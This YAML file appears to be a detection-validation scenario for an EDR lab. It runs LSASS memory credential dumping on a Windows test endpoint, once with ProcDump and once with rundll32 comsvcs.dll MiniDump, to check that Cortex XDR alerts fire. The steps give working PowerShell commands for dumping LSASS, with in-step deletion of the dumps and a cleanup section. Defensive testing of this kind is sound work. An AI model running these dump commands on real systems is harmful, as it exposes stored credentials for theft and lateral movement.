scenario_id: SIM-EDR-006
name: "LSASS Memory Credential Dump — comsvcs.dll LOLBin (Windows)"
version: "1.0"
status: active

# Detection-validation scenario (defensive QA). It drives the well-known,
# publicly documented Atomic Red Team T1003.001 tests against a LAB Windows
# endpoint to confirm Cortex XDR raises the LSASS-access BIOC, the comsvcs.dll
# MiniDump LOLBin analytic, and the stitched credential-theft correlation.
# All offensive detail lives in the anchor card TTP-2026-0002 (which is
# self-contained and ships its own cleanup). This file only orchestrates the
# detection check and references that card's detections.

plane: EDR
detection_types:
  - BIOC
  - XQL
  - Correlation
  - IOC

uc_ref: UCS-EDR-02
tc_ref: TC-EDR-03
tc_refs:
  - TC-EDR-03
  - TC-EDR-05
  - TC-ITDR-01
pov_scenario_id: POV-SC-021
uc_name: "Endpoint Detection & Response"
tc_name: "Validate multi-method malware detection (local sandbox, behavioral, static analysis)"

mitre_tactic: "TA0006"
mitre_tactic_name: "Credential Access"
mitre_technique: "T1003.001"
mitre_technique_name: "OS Credential Dumping: LSASS Memory"
additional_techniques:
  - technique: "T1003"
    name: "OS Credential Dumping"
  - technique: "T1218.011"
    name: "System Binary Proxy Execution: Rundll32"

threat_report: "Unit42 - Ignoble Scorpius (BlackSuit) / Muddled Libra (Scattered Spider)"
threat_report_url: "https://unit42.paloaltonetworks.com/"

execution_identity:
  default: administrator
  options:
    - administrator

push_supported: true
pull_supported: true

# ── Causality contract ──────────────────────────────────────────────────────
# The Atomic Red Team tests are launched from an interactive administrator
# powershell.exe session, which is the Causality Group Owner (CGO): the first
# untrusted ancestor after the signed shell (explorer.exe terminates the chain).
# Both credential-dump tools (ProcDump handle-open, rundll32 comsvcs MiniDump)
# are direct children of that CGO, so the graph is CGO(powershell) → step-01
# (process_lineage), with the sibling tool runs threaded on shared host/account
# entity rather than a false parent→child fork between them.
cgo_anchor:
  image_name: "powershell.exe"
  primary_username: "Administrator"

# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
# Rolled out per the S-07 per-plane convention
# (docs/uc_tc_mapping/scenario-methodology-defaults.md). Defaults are not
# fabricated KPIs — they map this plane to the methodology family its
# detection shape already belongs to in the v2.0 master methodology.
validation_methodology: "Endpoint Signal Injection & Detection Accuracy"
methodology_family: "F1"
primary_kpi: "MTTD"
threshold:
  kpi: "MTTD"
  op: "≤"
  value: 300
  unit: "seconds"
success_criteria: |
  The endpoint TTP signals injected by this scenario produce the expected
  XDR BIOC / XQL detections, and the mean time from signal emit to alert
  creation is within the MTTD budget. Each step's expected_detections row is
  validated against dataset=xdr_data.
moat_tier: "LEAD"

external_tools:
  - name: Atomic Red Team
    source: "https://github.com/redcanaryco/atomic-red-team"
    type: script
    install_inline: false
    adapter_ref: TOOL-ATOMIC-RED-TEAM

steps:
  - id: step-01
    name: "Open a handle to LSASS with sensitive access rights (ProcDump variant)"
    # ProcDump, run directly (atomic T1003.001 test 1's own command line). It
    # must already be on the target — PATH, or Atomic Red Team's
    # ExternalPayloads folder. There is no -GetPrereqs any more: that fetched
    # ProcDump from the internet at dispatch, which default-deny egress blocks,
    # and a step whose tool never arrived is not a detection miss — so a
    # missing ProcDump fails the step loudly instead. The dump is written,
    # measured and deleted inside this step.
    command: |
      $pd = @(Get-Command procdump64.exe, procdump.exe -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source) + @('C:\AtomicRedTeam\ExternalPayloads\procdump.exe') | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -First 1
      if (-not $pd) { Write-Error 'ProcDump not found on PATH or at C:\AtomicRedTeam\ExternalPayloads\procdump.exe: step-01 did not run, which is not a detection miss'; exit 1 }
      # comsvcs/ProcDump argument parsing breaks on a path with spaces, so a
      # spaced %TEMP% falls back to the system Temp directory.
      $dir = if ($env:TEMP -match '\s') { Join-Path $env:SystemRoot 'Temp' } else { $env:TEMP }
      $dmp = Join-Path $dir 'lsass-cortexsim-procdump.dmp'
      Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath $dmp
      & $pd -accepteula -ma lsass.exe $dmp
      if (-not (Test-Path -LiteralPath $dmp)) { Write-Error ('ProcDump wrote no dump (exit code {0}). This step cannot tell why: an endpoint-agent block, a beacon that is not elevated and LSASS running as a protected process look the same from here, so read the agent''s prevention log before scoring it' -f $LASTEXITCODE); exit 1 }
      $len = (Get-Item -LiteralPath $dmp).Length
      Remove-Item -Force -LiteralPath $dmp
      # ProcDump's exit code is a dump count, not a status.
      $global:LASTEXITCODE = 0
      Write-Output "cortexsim-edr006-procdump-lsass-dump-written bytes=$len (deleted in-step)"
    identity: administrator
    mitre_technique: "T1003.001"
    platforms: ["windows"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "ProcDump (-ma), a non-allowlisted process, opens lsass.exe with an access mask that includes PROCESS_VM_READ (0x10) or PROCESS_QUERY_INFORMATION (0x400)"
        ttp_ref: "TTP-2026-0002"
        detection_id: "bioc-lsass-handle-open-with-sensitive-access-rights"
      - plane: EDR
        type: XQL
        description: "Confirm LSASS access originating from a process outside the AV/EDR allowlist"
        ttp_ref: "TTP-2026-0002"
        detection_id: "xql-confirm-lsass-access-from-non-allowlisted-process"

  - id: step-02
    name: "Dump LSASS via comsvcs.dll MiniDump LOLBin (lives-off-the-land)"
    # The step is named comsvcs MiniDump and its detections key on rundll32 +
    # comsvcs.dll MiniDump, but it used to run atomic test 3 (Dumpert, direct
    # syscalls) — which produces neither. It now calls comsvcs directly.
    #
    # rundll32.exe is a GUI-subsystem binary, and PowerShell's call operator
    # does not wait for one: `& rundll32.exe ...` returned at once, Test-Path
    # raced the dump, the step failed with a message that named prevention,
    # and the full LSASS dump landed on disk after the step had exited. A pull
    # run never executes scenario cleanup, so nothing removed it.
    # Start-Process -Wait blocks until rundll32 exits; the poll then waits (at
    # most 15 s) until the dump's size stops changing before it is measured
    # and deleted. -ArgumentList is one string, passed through as rundll32's
    # command line, so `comsvcs.dll, MiniDump` keeps its comma. Unproven on
    # Windows: no Windows host has run this step.
    command: |
      $dir = if ($env:TEMP -match '\s') { Join-Path $env:SystemRoot 'Temp' } else { $env:TEMP }
      $dmp = Join-Path $dir 'lsass-cortexsim.dmp'
      Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath $dmp
      $lsass = (Get-Process -Name lsass).Id
      $rd = Start-Process -FilePath "$env:SystemRoot\System32\rundll32.exe" -ArgumentList ('{0}\System32\comsvcs.dll, MiniDump {1} {2} full' -f $env:SystemRoot, $lsass, $dmp) -NoNewWindow -Wait -PassThru
      $len = -1
      for ($i = 0; $i -lt 30; $i++) {
        if (Test-Path -LiteralPath $dmp) {
          $now = (Get-Item -LiteralPath $dmp).Length
          if ($now -gt 0 -and $now -eq $len) { break }
          $len = $now
        } elseif ($i -ge 4) { break }
        Start-Sleep -Milliseconds 500
      }
      Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath $dmp
      if (Test-Path -LiteralPath $dmp) { Write-Error "could not delete $dmp, which holds LSASS memory: remove it by hand"; exit 1 }
      if ($len -le 0) { Write-Error ('comsvcs MiniDump left no dump after rundll32 exited (exit code {0}). This step cannot tell why: an endpoint-agent block, a beacon that is not elevated and LSASS running as a protected process look the same from here, so read the agent''s prevention log before scoring it' -f $rd.ExitCode); exit 1 }
      $global:LASTEXITCODE = 0
      Write-Output "cortexsim-edr006-comsvcs-minidump-written bytes=$len (deleted in-step)"
    identity: administrator
    mitre_technique: "T1218.011"
    platforms: ["windows"]
    # rundll32(comsvcs MiniDump) and the step-01 ProcDump handle-open are both
    # direct children of the same powershell CGO on the same host/account — not a
    # fork of each other — so they thread on shared_entity, not process_lineage.
    causality:
      parent_step: step-01
      pivot: shared_entity
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "rundll32.exe spawned with comsvcs.dll MiniDump arguments — LOLBin credential dump"
        ttp_ref: "TTP-2026-0002"
        detection_id: "bioc-comsvcs-dll-minidump-lolbin-execution"
      - plane: EDR
        type: XQL
        description: "Confirm comsvcs.dll MiniDump invocation by rundll32 outside scheduled-task context"
        ttp_ref: "TTP-2026-0002"
        detection_id: "xql-confirm-comsvcs-dll-minidump-invocation"
      - plane: EDR
        type: IOC
        description: "LSASS memory dump artifact (lsass-*.dmp) written to disk"
        ttp_ref: "TTP-2026-0002"
        detection_id: "ioc-filename-lsass-dmp"

  - id: step-03
    name: "Confirm stitched credential-theft correlation"
    # The dumps live where steps 01-02 wrote them (%TEMP%, or the system Temp
    # directory when %TEMP% has a space) and are deleted in-step, so this
    # confirms none is left on disk rather than listing one.
    command: |
      $left = @(Get-ChildItem -Force -ErrorAction SilentlyContinue -Path "$env:TEMP\lsass-cortexsim*.dmp", "$env:SystemRoot\Temp\lsass-cortexsim*.dmp")
      if ($left.Count -gt 0) { $left | Select-Object FullName, Length; Write-Error 'an LSASS dump from steps 01-02 is still on disk'; exit 1 }
      Write-Output 'cortexsim-edr006-no-lsass-dump-left-on-disk'
      Write-Output '[*] LSASS dump sequence complete — validating XSIAM correlation'
    identity: administrator
    mitre_technique: "T1003.001"
    platforms: ["windows"]
    # Validation step reads the dump artifact step-02 wrote, on the same host and
    # under the same powershell CGO — shared_entity (host + dump file), not a fork.
    causality:
      parent_step: step-02
      pivot: shared_entity
    expected_detections:
      - plane: EDR
        type: Correlation
        description: "Credential Theft — LSASS Memory Dump: handle-open + comsvcs MiniDump + dump-file write stitched into one incident"
        ttp_ref: "TTP-2026-0002"
        detection_id: "CR-CRED-0001"

cleanup:
  commands:
    # Only the files this scenario or its atomic tests name — never an
    # arbitrary lsass-*.dmp the customer may be keeping — and it reports what it
    # actually found, not that something was removed.
    - "$found = @(Get-ChildItem -Force -ErrorAction SilentlyContinue -Path \"$env:TEMP\\lsass-cortexsim*.dmp\", \"$env:SystemRoot\\Temp\\lsass-cortexsim*.dmp\", \"$env:TEMP\\lsass-comsvcs.dmp\", \"$env:SystemRoot\\Temp\\lsass_dump.dmp\", \"$env:SystemRoot\\Temp\\dumpert.dmp\"); foreach ($f in $found) { Remove-Item -Force -LiteralPath $f.FullName; Write-Output ('removed ' + $f.FullName + ' (' + $f.Length + ' bytes)') }; if ($found.Count -eq 0) { Write-Output 'no LSASS dump artifacts were on disk' }"
    - "Write-Host '[CortexSim] SIM-EDR-006 cleanup complete'"

